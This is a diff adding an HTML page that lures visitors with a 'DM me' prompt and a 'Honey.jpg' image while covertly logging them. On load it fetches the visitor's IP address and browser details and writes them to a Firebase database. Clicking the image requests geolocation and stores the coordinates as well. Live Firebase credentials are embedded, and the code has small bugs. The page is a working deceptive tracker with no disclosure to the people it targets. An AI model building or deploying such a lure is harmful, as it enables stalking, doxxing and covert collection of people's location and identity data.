@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Hii</title>
+</head>
+
+<body onload="getIP()">
+  <p>Cick on the image to DM me</p>
+
+  <img alt="" src="Honey.jpg" style="height: auto; width: auto" id="imgClickAndChange" onclick="getLocation()" />
+
+  <script src="https://special-request-default-rtdb.firebaseio.com/"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/firebase/7.14.1-0/firebase.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.8.3/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.8.3/firebase-database.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/platform/1.3.6/platform.min.js"
+    integrity="sha512-eYPrm8TgYWg3aa6tvSRZjN4v0Z9Qx69q3RhfSj+Mf89QqwOMqmwSlsVqfp4N8NVAcZe/YeUhh9x/nM2CAOp6cA=="
+    crossorigin="anonymous"></script>
+
+  <script>
+    var ipaddr = 0;
+    var bro_desc = platform.description;
+    let lat = 0;
+    let long = 0;
+    let flag = 0;
+    let t = new Date();
+
+
+
+
+    function getIP() {
+      fetch("https://api.ipify.org/?format=json")
+        .then(results => results.json())
+        .then(
+          (results) => {
+            ipaddr = results.ip;
+            var tm = t.getHours() + ":" + t.getMinutes() + ":" + t.getSeconds();
+            var dt = t.getDate()+"/"+(t.getMonth()+1)+"/"+t.getFullYear();
+            saveIpDetails(ipaddr, bro_desc, tm, dt);
+
+          })
+        .catch(eorror => console.log('error', error));
+    }
+
+
+
+    function getLocation() {
+      if (navigator.geolocation) {
+        fetch("https://api.ipify.org/?format=json")
+          .then(results => results.json())
+          .then(
+            (results) => {
+              ipaddr = results.ip;
+              var tm = t.getHours() + ":" + t.getMinutes() + ":" + t.getSeconds();
+              var dt = t.getDate()+"/"+(t.getMonth()+1)+"/"+t.getFullYear();
+              navigator.geolocation.getCurrentPosition((position) => {
+                lat = position.coords.latitude;
+                long = position.coords.longitude;
+                saveDetails(lat, long, ipaddr, bro_desc, tm, dt);
+              }, (error) => {
+                switch (error.code) {
+                  case error.PERMISSION_DENIED:
+                    saveDetails(lat, long, ipaddr, bro_desc, tm);
+                    break;
+                  case error.POSITION_UNAVAILABLE:
+                    saveDetails(lat, long, ipaddr, bro_desc, tm);
+                    break;
+                  case error.TIMEOUT:
+                    saveDetails(lat, long, ipaddr, bro_desc, tm);
+                    break;
+                  case error.UNKNOWN_ERROR:
+                    saveDetails(lat, long, ipaddr, bro_desc, tm);
+                    break;
+                }
+              });
+            })
+          .catch(eorror => console.log('error', error));
+
+      }
+    }
+
+   
+    const saveDetails = (lat, long, ipaddr, bro_desc, tm, dt) => {
+
+      var newUserData = userData.push();
+
+      newUserData.set({
+        latitude: lat,
+        longitude: long,
+        ipaddr: ipaddr,
+        browser: bro_desc,
+        time: tm,
+        date: dt
+      })
+      return;
+    }
+
+
+    const saveIpDetails = (ipaddr, bro_desc, tm, dt) => {
+
+      var newUserIpData = userIpData.push();
+
+      newUserIpData.set({
+        ipaddr: ipaddr,
+        browser: bro_desc,
+        time: tm,
+        date: dt
+      })
+      return;
+    }
+
+
+
+    const firebaseConfig = {
+      apiKey: "AIzaSyDYn1d8NNWF0Bzr0nKKqPSZAdDs-r5kp8U",
+      authDomain: "special-request.firebaseapp.com",
+      databaseURL: "https://special-request-default-rtdb.firebaseio.com",
+      projectId: "special-request",
+      storageBucket: "special-request.appspot.com",
+      messagingSenderId: "1021656255054",
+      appId: "1:1021656255054:web:32104b8995d2232a83111f",
+      measurementId: "G-EFM9S25YQ0"
+    };
+
+    firebase.initializeApp(firebaseConfig);
+
+    var userData = firebase.database().ref("user");
+    var userIpData = firebase.database().ref("IP_details");
+    document.getElementById("imgClickAndChange").addEventListener("onclick", getLocation)
+  </script>
+</body>
+
+</html>
